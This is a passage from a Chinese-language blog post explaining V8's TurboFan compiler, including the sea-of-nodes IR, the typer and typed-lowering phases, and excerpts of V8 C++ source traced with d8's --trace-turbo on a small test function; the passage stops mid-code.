<p><img src="/2021/05/13/v8-basic/21.png" alt></p>
<p>引入之后的pipline如下</p>
<p><img src="/2021/05/13/v8-basic/22.png" alt></p>
<p><img src="/2021/05/13/v8-basic/24.png" alt></p>
<p>Ignition的字节码表如下</p>
<p><img src="/2021/05/13/v8-basic/23.png" alt></p>
<p>17年之后就移除了Crankshaft和Full-codegen。</p>
<p><img src="/2021/05/13/v8-basic/25.png" alt></p>
<h3 id="TurboFan"><a href="#TurboFan" class="headerlink" title="TurboFan"></a>TurboFan</h3><p>最后重点介绍一下<code>TurboFan</code>。</p>
<h4 id="Sea-of-Nodes"><a href="#Sea-of-Nodes" class="headerlink" title="Sea of Nodes"></a>Sea of Nodes</h4><p>TurboFan在一个叫做<code>sea of nodes</code>的程序上运行。<code>Nodes</code>可以表示算数运算，load、store、calls和常量等。一共有三种edge:control edges、value edges、effect edges。</p>
<p>control edge和CFG中看到的一样，它们用于分支和循环。</p>
<p><img src="/2021/05/13/v8-basic/26.png" alt></p>
<p>value edges是在Data Flow Graph中的边，它们表示数据的依赖关系。</p>
<p><img src="/2021/05/13/v8-basic/27.png" alt></p>
<p>effect edges标识出读写的状态。以<code>obj[x] = obj[x] + 1</code>为例，其effect chain如下图所示.整个chain为<code>load-&gt;add-&gt;store</code></p>
<p><img src="/2021/05/13/v8-basic/28.png" alt></p>
<p>对于想要详细了解的同学，可以参考<a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_074" target="_blank" rel="noopener">TurboFan JIT Design</a></p>
<p>之前在Ubuntu 20.04搭了v8的环境，我们也可以动手看下<code>sea of nodes</code>。由于我用的是最新版本的v8，所以这里似乎已经没有了CheckBounds的消除，原本是参考<a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/" target="_blank" rel="noopener">introduction-to-turbofan</a>进行实验，<del>现在还是依自己得到的结果为准</del>。<code>Moon师傅</code>下午指点了一下俺，终于明白为什么我的图和博客中的不一样了，下面的代码增加了一行<code>%PrepareFunctionForOptimization(opt_me);</code>，是为obj的feedback做初始化，之后的两次函数调用使得feedback填入了值，从而在<code>%OptimizeFunctionOnNextCall(opt_me)</code>调用时做了<code>包含有feedback的</code>优化。</p>
<p>编写如下js代码进行实验，<code>./d8 1.js --allow-natives-syntax --trace-turbo</code>得到turbo json文件，使用<code>python -m SimpleHTTPServer</code>启动一个服务器，访问本地的8000端口即可查看sea of nodes。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="built_in">Math</span>.random();</span><br><span class="line">  <span class="keyword">let</span> y = x + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> y + <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(opt_me);</span><br><span class="line">opt_me();</span><br><span class="line">opt_me();</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me();</span><br></pre></td></tr></table></figure>
<h4 id="Optimization-phase"><a href="#Optimization-phase" class="headerlink" title="Optimization phase"></a>Optimization phase</h4><p>第一个图为<code>BytecodeGraphBuilder</code>，每个阶段后面的编号表示生成的顺序，这个阶段是将js代码翻译为字节码，生成基本的IR图，可以看到最后return前调用<code>SpeculativeNumberAdd</code>来对变量进行加和。</p>
<p><img src="/2021/05/13/v8-basic/29.png" alt></p>
<p>第二个为<code>Inlining</code>，将一些代码内联到调用函数处</p>
<p><img src="/2021/05/13/v8-basic/30.png" alt></p>
<p>接下来是一个比较重要的阶段<code>Typer phase</code>，在这个阶段会尽可能地推断出节点的类型，这部分的优化代码在<code>OptimizeGraph</code>中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TyperPhase</span> &#123;</span></span><br><span class="line">  DECL_PIPELINE_PHASE_CONSTANTS(Typer)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone, Typer* typer)</span> </span>&#123;</span><br><span class="line">    <span class="function">NodeVector <span class="title">roots</span><span class="params">(temp_zone)</span></span>;</span><br><span class="line">    data-&gt;jsgraph()-&gt;GetCachedNodes(&amp;roots);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make sure we always type True and False. Needed for escape analysis.</span></span><br><span class="line">    roots.push_back(data-&gt;jsgraph()-&gt;TrueConstant());</span><br><span class="line">    roots.push_back(data-&gt;jsgraph()-&gt;FalseConstant());</span><br><span class="line"></span><br><span class="line">    <span class="function">LoopVariableOptimizer <span class="title">induction_vars</span><span class="params">(data-&gt;jsgraph()-&gt;graph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         data-&gt;common(), temp_zone)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (FLAG_turbo_loop_variable) induction_vars.Run();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The typer inspects heap objects, so we need to unpark the local heap.</span></span><br><span class="line">    <span class="function">UnparkedScopeIfNeeded <span class="title">scope</span><span class="params">(data-&gt;broker())</span></span>;</span><br><span class="line">    typer-&gt;Run(roots, &amp;induction_vars);   <span class="comment">//here typer-&gt;run</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::OptimizeGraph</span><span class="params">(Linkage* linkage)</span> </span>&#123;</span><br><span class="line">  PipelineData* data = <span class="keyword">this</span>-&gt;data_;</span><br><span class="line"></span><br><span class="line">  data-&gt;BeginPhaseKind(<span class="string">"V8.TFLowering"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Type the graph and keep the Typer running such that new nodes get</span></span><br><span class="line">  <span class="comment">// automatically typed when they are created.</span></span><br><span class="line">  Run&lt;TyperPhase&gt;(data-&gt;CreateTyper());</span><br><span class="line">  RunPrintAndVerify(TyperPhase::phase_name());</span><br><span class="line">  <span class="comment">//..</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>typer.cc</code>中找到对应的函数，会发现它将遍历图上的所有节点，试图优化掉它们。例如在这里当我们的visitor访问到一个<code>JSCall</code>节点之后会调用<code>JSCallTyper</code>，每一个调用的builtin函数都关联了一个Typer，我们的测试代码使用了<code>Math.random</code>，在这里被优化为了<code>PlainNumber</code>这个type。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Typer::Run</span><span class="params">(<span class="keyword">const</span> NodeVector&amp; roots,</span></span></span><br><span class="line"><span class="function"><span class="params">                LoopVariableOptimizer* induction_vars)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (induction_vars != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    induction_vars-&gt;ChangeToInductionVariablePhis();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">Visitor <span class="title">visitor</span><span class="params">(<span class="keyword">this</span>, induction_vars)</span></span>;</span><br><span class="line">  <span class="function">GraphReducer <span class="title">graph_reducer</span><span class="params">(zone(), graph(), tick_counter_, broker())</span></span>;</span><br><span class="line">  graph_reducer.AddReducer(&amp;visitor);</span><br><span class="line">  <span class="keyword">for</span> (Node* <span class="keyword">const</span> root : roots) graph_reducer.ReduceNode(root);</span><br><span class="line">  graph_reducer.ReduceGraph();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (induction_vars != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// Validate the types computed by TypeInductionVariablePhi.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> entry : induction_vars-&gt;induction_variables()) &#123;</span><br><span class="line">      InductionVariable* induction_var = entry.second;</span><br><span class="line">      <span class="keyword">if</span> (induction_var-&gt;phi()-&gt;opcode() == IrOpcode::kInductionVariablePhi) &#123;</span><br><span class="line">        CHECK(visitor.InductionVariablePhiTypeIsPrefixedPoint(induction_var));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    induction_vars-&gt;ChangeToPhisAndInsertGuards();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typer</span>:</span>:Visitor : <span class="keyword">public</span> Reducer &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Visitor</span><span class="params">(Typer* typer, LoopVariableOptimizer* induction_vars)</span></span></span><br><span class="line">      : typer_(typer),</span><br><span class="line">        induction_vars_(induction_vars),</span><br><span class="line">        weakened_nodes_(typer-&gt;zone()) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">reducer_name</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> <span class="string">"Typer"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Reduction <span class="title">Reduce</span><span class="params">(Node* node)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node-&gt;op()-&gt;ValueOutputCount() == <span class="number">0</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">    <span class="keyword">return</span> UpdateType(node, TypeNode(node));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//call visitor such as JSCallTyper</span></span><br><span class="line">&#125;</span><br><span class="line">Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!fun.IsHeapConstant() || !fun.AsHeapConstant()-&gt;Ref().IsJSFunction()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NonInternal();</span><br><span class="line">  &#125;</span><br><span class="line">  JSFunctionRef function = fun.AsHeapConstant()-&gt;Ref().AsJSFunction();</span><br><span class="line">  <span class="keyword">if</span> (!function.serialized()) &#123;</span><br><span class="line">    TRACE_BROKER_MISSING(t-&gt;broker(), <span class="string">"data for function "</span> &lt;&lt; function);</span><br><span class="line">    <span class="keyword">return</span> Type::NonInternal();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!function.shared().HasBuiltinId()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NonInternal();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">switch</span> (function.shared().builtin_id()) &#123;</span><br><span class="line">    <span class="keyword">case</span> Builtins::kMathRandom:</span><br><span class="line">      <span class="keyword">return</span> Type::PlainNumber();</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于<code>TypeNumberConstant</code>类型的节点来说，大部分时候得到的类型都是一个<code>Range</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Type Typer::Visitor::TypeNumberConstant(Node* node) &#123;</span><br><span class="line">  <span class="keyword">double</span> number = OpParameter&lt;<span class="keyword">double</span>&gt;(node-&gt;op());</span><br><span class="line">  <span class="keyword">return</span> Type::Constant(number, zone());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Type <span class="title">Type::Constant</span><span class="params">(<span class="keyword">double</span> value, Zone* zone)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (RangeType::IsInteger(value)) &#123;</span><br><span class="line">    <span class="keyword">return</span> Range(value, value, zone);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IsMinusZero(value)) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::MinusZero();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::isnan(value)) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NaN();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>继续来看<code>SpeculativeNumberAdd</code>的节点类型处理，它属于<code>OperationTyper</code>,最终通过<code>Name</code>调用了<code>OperationTyper::NumberAdd(Type lhs, Type rhs)</code>，它首先对lhs(left hand side)和rhs(right hand side)两个节点调用<code>SpeculativeToNumber</code>赋值，之后调用<code>NumberAdd</code>进行加和，在这个函数中会对参数类型进行判断，大多数情况下返回<code>PlainNumber</code>类型。</p>
<p>总结一下，我们第一个图中的<code>JSCall(MathRandom)</code>最终会被推断为<code>PlainNumber</code>，<code>NumberConstant[n]</code>且<code>n != -0 &amp; n != NaN</code>的会被推断为<code>Range(n,n)</code>，而<code>range(n,n)</code>又会被推断为<code>PlainNumber</code>，<code>SpeculativeNumberAdd(PlainNumber, PlainNumber)</code>会被推断为<code>PlainNumber</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//operation-typer.cc</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPECULATIVE_NUMBER_BINOP(Name)                         \</span></span><br><span class="line">  Type OperationTyper::Speculative##Name(Type lhs, Type rhs) &#123; \</span><br><span class="line">    lhs = SpeculativeToNumber(lhs);                            \</span><br><span class="line">    rhs = SpeculativeToNumber(rhs);                            \</span><br><span class="line">    <span class="keyword">return</span> Name(lhs, rhs);                                     \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Type <span class="title">OperationTyper::SpeculativeToNumber</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ToNumber(Type::Intersect(type, Type::NumberOrOddball(), zone()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过这个阶段之后，图变成了下面这样(注意这里并没有如上文分析的推断结果)</p>
<p><img src="/2021/05/13/v8-basic/31.png" alt></p>
<p><code>Typer Lowering</code>就在<code>typer phase</code>的后面，这里做了更多的节点消除。我们来看下<code>TypedOptimization</code>以及<code>TypedOptimization::Reduce</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::OptimizeGraph</span><span class="params">(Linkage* linkage)</span> </span>&#123;</span><br><span class="line">  PipelineData* data = <span class="keyword">this</span>-&gt;data_;</span><br><span class="line"></span><br><span class="line">  data-&gt;BeginPhaseKind(<span class="string">"V8.TFLowering"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Type the graph and keep the Typer running such that new nodes get</span></span><br><span class="line">  <span class="comment">// automatically typed when they are created.</span></span><br><span class="line">  Run&lt;TyperPhase&gt;(data-&gt;CreateTyper());</span><br><span class="line">  RunPrintAndVerify(TyperPhase::phase_name());</span><br><span class="line"></span><br><span class="line">  Run&lt;TypedLoweringPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(TypedLoweringPhase::phase_name());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypedLoweringPhase</span> &#123;</span></span><br><span class="line">  DECL_PIPELINE_PHASE_CONSTANTS(TypedLowering)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    <span class="function">GraphReducer <span class="title">graph_reducer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        temp_zone, data-&gt;graph(), &amp;data-&gt;info()-&gt;tick_counter(), data-&gt;broker(),</span></span></span><br><span class="line"><span class="function"><span class="params">        data-&gt;jsgraph()-&gt;Dead(), data-&gt;observe_node_manager())</span></span>;</span><br><span class="line">    <span class="function">DeadCodeElimination <span class="title">dead_code_elimination</span><span class="params">(&amp;graph_reducer, data-&gt;graph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                              data-&gt;common(), temp_zone)</span></span>;</span><br><span class="line">    <span class="function">JSCreateLowering <span class="title">create_lowering</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                     data-&gt;jsgraph(), data-&gt;broker(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                     temp_zone)</span></span>;</span><br><span class="line">    <span class="function">JSTypedLowering <span class="title">typed_lowering</span><span class="params">(&amp;graph_reducer, data-&gt;jsgraph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                   data-&gt;broker(), temp_zone)</span></span>;</span><br><span class="line">    <span class="function">ConstantFoldingReducer <span class="title">constant_folding_reducer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        &amp;graph_reducer, data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    <span class="function">TypedOptimization <span class="title">typed_optimization</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    <span class="function">SimplifiedOperatorReducer <span class="title">simple_reducer</span><span class="params">(&amp;graph_reducer, data-&gt;jsgraph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                             data-&gt;broker())</span></span>;</span><br><span class="line">    <span class="function">CheckpointElimination <span class="title">checkpoint_elimination</span><span class="params">(&amp;graph_reducer)</span></span>;</span><br><span class="line">    <span class="function">CommonOperatorReducer <span class="title">common_reducer</span><span class="params">(&amp;graph_reducer, data-&gt;graph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         data-&gt;broker(), data-&gt;common(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         data-&gt;machine(), temp_zone)</span></span>;</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line"></span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;create_lowering);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;typed_lowering);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;simple_reducer);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;checkpoint_elimination);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;common_reducer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ConstantFoldingReducer, JSCreateLowering, JSTypedLowering, and</span></span><br><span class="line">    <span class="comment">// TypedOptimization access the heap.</span></span><br><span class="line">    <span class="function">UnparkedScopeIfNeeded <span class="title">scope</span><span class="params">(data-&gt;broker())</span></span>;</span><br><span class="line"></span><br><span class="line">    graph_reducer.ReduceGraph();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当一个节点已经被访问过，且opcode为<code>IrOpcode::kSpeculativeNumberAdd</code>，则调用<code>ReduceSpeculativeNumberAdd(node)</code>.在这个函数中首先取节点的<code>hint</code>属性，我们的<code>lhs</code>和<code>rhs</code>都是<code>PlainNumber</code>，都有<code>NumberOperationHint::kNumber</code>的hint属性，因此最终执行replace将原本的<code>kSpeculativeNumberAdd</code>节点替换为了<code>NumberAdd</code>节点。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">TypedOptimization::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="function">DisallowHeapAccessIf <span class="title">no_heap_access</span><span class="params">(!FLAG_turbo_direct_heap_access)</span></span>;</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kSpeculativeNumberAdd:</span><br><span class="line">      <span class="keyword">return</span> ReduceSpeculativeNumberAdd(node);</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">Reduction <span class="title">TypedOptimization::ReduceSpeculativeNumberAdd</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  Node* <span class="keyword">const</span> lhs = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">  Node* <span class="keyword">const</span> rhs = NodeProperties::GetValueInput(node, <span class="number">1</span>);</span><br><span class="line">  Type <span class="keyword">const</span> lhs_type = NodeProperties::GetType(lhs);</span><br><span class="line">  Type <span class="keyword">const</span> rhs_type = NodeProperties::GetType(rhs);</span><br><span class="line">  NumberOperationHint hint = NumberOperationHintOf(node-&gt;op());</span><br><span class="line">  <span class="keyword">if</span> ((hint == NumberOperationHint::kNumber ||</span><br><span class="line">       hint == NumberOperationHint::kNumberOrOddball) &amp;&amp;</span><br><span class="line">      BothAre(lhs_type, rhs_type, Type::PlainPrimitive()) &amp;&amp;</span><br><span class="line">      NeitherCanBe(lhs_type, rhs_type, Type::StringOrReceiver())) &#123;</span><br><span class="line">    <span class="comment">// SpeculativeNumberAdd(x:-string, y:-string) =&gt;</span></span><br><span class="line">    <span class="comment">//     NumberAdd(ToNumber(x), ToNumber(y))</span></span><br><span class="line">    Node* <span class="keyword">const</span> toNum_lhs = ConvertPlainPrimitiveToNumber(lhs);</span><br><span class="line">    Node* <span class="keyword">const</span> toNum_rhs = ConvertPlainPrimitiveToNumber(rhs);</span><br><span class="line">    Node* <span class="keyword">const</span> value =</span><br><span class="line">        graph()-&gt;NewNode(simplified()-&gt;NumberAdd(), toNum_lhs, toNum_rhs);</span><br><span class="line">    ReplaceWithValue(node, value);</span><br><span class="line">    <span class="keyword">return</span> Replace(value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此阶段后的图如下。</p>
<p><img src="/2021/05/13/v8-basic/32.png" alt></p>
<p>对于JSCall节点,<code>JSTypedLowering::ReduceJSCall</code>函数最终创建了<code>LoadField</code>节点并将<code>JSCall</code>的opcode转换为<code>Call</code>的opcode(注意这里的node没有变化，只是opcode发生了变化)。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">JSTypedLowering::ReduceJSCall</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load the context from the &#123;target&#125;.</span></span><br><span class="line">    Node* context = effect = graph()-&gt;NewNode(</span><br><span class="line">        simplified()-&gt;LoadField(AccessBuilder::ForJSFunctionContext()), target,</span><br><span class="line">        effect, control);</span><br><span class="line">    NodeProperties::ReplaceContextInput(node, context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update the effect dependency for the &#123;node&#125;.</span></span><br><span class="line">    NodeProperties::ReplaceEffectInput(node, effect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Compute flags for the call.</span></span><br><span class="line">    CallDescriptor::Flags flags = CallDescriptor::kNeedsFrameState;</span><br><span class="line">    Node* new_target = jsgraph()-&gt;UndefinedConstant();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> formal_count = shared-&gt;internal_formal_parameter_count();</span><br><span class="line">    <span class="keyword">if</span> (formal_count != kDontAdaptArgumentsSentinel 